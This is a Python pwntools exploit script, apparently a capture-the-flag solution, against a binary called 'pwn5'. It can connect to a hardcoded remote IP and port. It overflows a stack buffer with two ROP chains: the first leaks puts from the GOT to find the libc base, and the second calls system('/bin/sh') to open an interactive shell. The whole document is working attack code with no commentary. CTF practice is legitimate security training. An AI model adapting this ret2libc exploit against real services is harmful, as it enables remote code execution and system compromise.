from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8005]
libc=ELF('./libc-2.31.so')
elf = ELF('./pwn5')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn5")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x40121b
pop_rdi = 0x4012f3
ret = 0x40101a

ru(b'words?\n')
sl('-1')
payload = b'a' * 0x50 + b'a' * 0x8 + p64(pop_rdi)
payload += p64(puts_got) + p64(puts_plt) + p64(main_addr)
sl(payload)
leak_addr = u64(p.recvline()[:-1].ljust(8,b'\x00'))
pr("leak",leak_addr)
libc_base = leak_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pr("libc_base",libc_base)
#gdb.attach(p)
ru(b'words?\n')
sl('-1')
#gdb.attach(p)
payload2 = b'a' * (0x50 + 0x8) + p64(ret) +  p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) 
sl(payload2)
#gdb.attach(p)
shell()
